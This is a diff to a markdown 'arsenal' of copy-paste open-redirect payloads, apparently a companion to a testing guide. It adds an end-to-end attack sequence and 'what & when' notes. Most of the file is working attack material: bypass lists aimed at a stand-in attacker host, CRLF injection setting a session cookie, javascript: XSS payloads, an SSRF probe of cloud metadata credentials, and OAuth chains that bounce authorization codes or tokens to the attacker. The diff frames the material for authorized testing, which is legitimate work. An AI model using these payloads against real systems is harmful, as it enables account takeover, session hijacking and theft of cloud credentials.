@@ -1,5 +1,7 @@
 # Open Redirect — Arsenal (copy-paste payloads & bypasses)
 
+**Author:** x8bitranjit
+
 > Companion to `OPEN_REDIRECT_TESTING_GUIDE.md`. Replace `evil.example` with **a host you control** and `target.com`
 > with the app's real domain. Test cheapest-first (plain → `//` → `\` → `@` → whitelist → encoding → scheme).
 > Confirm with `curl -s -D - -o /dev/null "<url>" | grep -i '^location:'` (server sink) or a real browser (JS/meta sink).
@@ -7,7 +9,32 @@
 
 ---
 
+## 0.0 The whole attack in one sequence (find → parser-gap bypass → detonate, worked end-to-end in Guide §9.5)
+*Spray the param set → baseline off-origin → beat validation with the `//`/`\`/`@` matrix → classify the sink → detonate the highest of the three. A bare redirect is Low; the sink decides whether it's DOM-XSS, OAuth ATO, or SSRF.*
+
+```bash
+T='https://app.example.com'; EVIL='evil.oast.fun'
+# 1. FIND — spray the name-set; here ?next= steers a redirect
+# 2. BASELINE off-origin (read Location, don't follow)
+curl -s -D - "$T/login?next=https://$EVIL" -o /dev/null | grep -i '^location'    # rejected? -> validator exists -> step 3
+# 3. PARSER-GAP MATRIX (validator sees path, browser sees host) — cheapest first
+for p in "//$EVIL" "/\\$EVIL" "https:/\\$EVIL" "https://app.example.com@$EVIL" "https://app.example.com.$EVIL"; do
+  echo -n "$p => "; curl -s -D - "$T/login?next=$p" -o /dev/null | grep -i '^location'
+done      # //EVIL usually lands = scheme-relative bypass
+# 4. CLASSIFY the sink (grep the page JS): 302 Location header | <meta refresh> | location.href = value (JS sink = jackpot)
+# 5. DETONATE:
+#   (1) JS sink  -> ?next=javascript:alert(document.domain)      => DOM-XSS (High -> session theft)   [filters: java%09script:, JaVaScRiPt:, javascript:javascript:]
+#   (2) OAuth redirect_uri on allowed host -> ?next=//EVIL bounces the ?code= to you => ATO (Critical, chain B)
+#   (3) server-side fetcher locked to host -> ?next=//169.254.169.254/latest/meta-data/ => SSRF -> cloud creds (High)
+# 6. Prove benignly (own marker host / own cookie), report by the DETONATOR reached (NOT "open redirect Low").
+```
+**Cash-out map:** JS sink + `javascript:` → **DOM-XSS → ATO (High, §10)** · OAuth client + open redirect → **`code`/token theft → ATO (Critical, §11)** · SSRF fetcher + redirect → **allow-list bypass → metadata/creds (High, §12)** · reflected into `Location` + `\r\n` → **CRLF/response-splitting → `Set-Cookie`/cache/XSS (§9)** · none of the above → **credential phishing on the trusted origin (Low–Medium, §14)**.
+
+---
+
 ## 0. Parameter name-set (spray these keys on every endpoint)
+
+> **What & when:** these are the "cards" apps most often let you write an address on. Before you can test any bypass you need to *find the parameter that steers a redirect* — so spray this whole name-set at every login, logout, SSO, checkout, "share", "download", and "preview" endpoint, and mine historical URLs for ones the live site no longer links. Use it at the very start (Phase 0 recon).
 
 ```
 next  returnUrl  ReturnUrl  return  return_to  returnTo  redirect  redirect_uri  redirect_url  redirectUrl
@@ -21,6 +48,8 @@ Discover hidden ones with **Arjun** / **Param Miner**; harvest historical values
 
 ## 1. Baseline (naive apps)
 
+> **What & when:** the "does the concierge walk anyone off-property at all?" test. Fire these first, before any clever bypass — a surprising number of apps do zero validation and a plain `https://evil.example` just works. `//evil.example` is in here because it's the single highest-yield line in the whole file. If one of these lands off-origin, skip straight to the escalation sections (§8/§10).
+
 ```
 https://evil.example
 https://evil.example/
@@ -31,6 +60,8 @@ https:evil.example
 ```
 
 ## 2. Protocol-relative & backslash (parser gaps — highest yield)
+
+> **What & when:** reach for these the moment a plain absolute URL gets blocked. They all exploit the *same* trick — the validator and the browser disagree about where the "address" part of the URL begins. `//` and `\` (browsers fold backslash to slash; validators don't) are the workhorses; the triple-slash and encoded variants mop up validators that strip or normalize a little. This is the first bypass block to walk after baseline fails.
 
 ```
 //evil.example
@@ -51,6 +82,8 @@ https:///evil.example
 
 ## 3. `@` userinfo (the real host is after the @)
 
+> **What & when:** the go-to when the check is "does it **start with** `https://target.com`?". Everything before an `@` in a URL is just a username, so `https://target.com@evil.example` starts with the magic words yet lands on `evil.example`. Try the plain form first, then the encoded (`%40`) and multi-`@` variants for validators that decode or split differently. This is one third of the parser-gap trio.
+
 ```
 https://target.com@evil.example
 https://target.com@evil.example/
@@ -66,6 +99,8 @@ https://foo@evil.example@target.com          (multi-@ parser confusion)
 
 ## 4. Whitelist / allow-list bypass
 
+> **What & when:** use when the app clearly *has* a guest list and you've confirmed plain off-origin is blocked. The trick is to match *how* the list is checked: a "contains target.com" check falls to putting the word in the path/query/fragment; a "startsWith" check falls to `@`/subdomain-label tricks; a strict host list you can only beat by **owning a host inside it** (subdomain takeover) or **chaining an allowed host's own open redirect**. Pick the sub-block that matches the check you observed.
+
 **"contains target.com":**
 ```
 https://evil.example/target.com
@@ -80,7 +115,7 @@ https://evil.example/target.com%2f..
 ```
 https://target.com.evil.example
 https://target.com@evil.example
-https://target.com%2 f.evil.example
+https://target.com%2f.evil.example
 https://target.com\.evil.example
 https://target.com%5c.evil.example
 https://target.com%2f%2f@evil.example
@@ -95,6 +130,8 @@ https://allowed.target.com/out?url=//evil.example
 ```
 
 ## 5. Encoding & control-character evasion
+
+> **What & when:** reach for these when a bypass payload is *recognized and blocked* — the filter sees your `//` or `@` and strips it. Double-encoding (`%252f`) beats filters that decode only once (decode → passes check → browser decodes again → follows). Control chars (`%09` tab, `%00` NULL, `%0d%0a` CRLF) beat filters that normalize whitespace inconsistently or truncate on NULL. This is a second-line block: apply it to a payload the app already caught.
 
 ```
 %2f%2fevil.example                    (// url-encoded)
@@ -122,6 +159,8 @@ http://xn--...                         (punycode homoglyph of target.com — phi
 
 ## 7. CRLF / HTTP response splitting (redirect param reflected into Location)
 
+> **What & when:** try these *only* when your value lands in the `Location` **response header** (a server 30x sink) — not for meta/JS sinks. The `%0d%0a` ("press Enter") lets you inject a whole new header line, turning a redirect into response-splitting. It's an escalation move: confirm the plain redirect works into `Location` first, then see whether the newline survives to inject `Set-Cookie`/a second header.
+
 ```
 ?next=https://target.com/%0d%0aLocation:%20https://evil.example
 ?next=https://target.com/%0d%0aSet-Cookie:%20session=attacker
@@ -132,6 +171,8 @@ http://xn--...                         (punycode homoglyph of target.com — phi
 > If `%0d%0a` survives into the `Location` header → **CRLF injection / response splitting** (guide §9; CWE-113). Escalate to `Set-Cookie` (session fixation), a second `Location`, or header-based cache poisoning/XSS (cross-ref Host-Header & Request-Smuggling kits).
 
 ## 8. `javascript:` / `data:` (CLIENT-SIDE JS sink → DOM-XSS, guide §10)
+
+> **What & when:** the highest-ceiling block — fire it whenever the sink is **client-side JavaScript** (`location.href = value`, `.assign`, `.replace`, `window.open`, anchor `href`). Instead of a redirect you're trying for *script execution* (XSS). Start with the clean `javascript:alert(document.domain)`; if a naive scheme filter blocks it, work down the tab/newline/case/nested/encoded variants. Don't bother throwing these at a `Location` header — browsers ignore non-`http(s)` schemes there.
 
 ```
 javascript:alert(document.domain)
@@ -161,6 +202,8 @@ http://localtest.me/        http://spoofed.burpcollaborator.net/
 Use an **allowed-host open redirect** that bounces to one of these when the SSRF fetcher is locked to an allow-list.
 
 ## 10. OAuth / SSO chain payloads (guide §11)
+
+> **What & when:** the money block — use when the redirecting host takes part in an OAuth/SSO flow. Try the loose-validation direct wins first (maybe the IdP's `redirect_uri` check is weak enough to point straight at your host). If it's strict, switch to **chain B**: point `redirect_uri` at an *open redirect on the allowed client host* so the IdP mails the `code`/`token` to the approved host, which then bounces it — secret and all — to you. Always catch **your own** token with `token_catcher.py`.
 
 ```
 # B — open redirect on the ALLOWED client host defeats a strict redirect_uri allow-list:
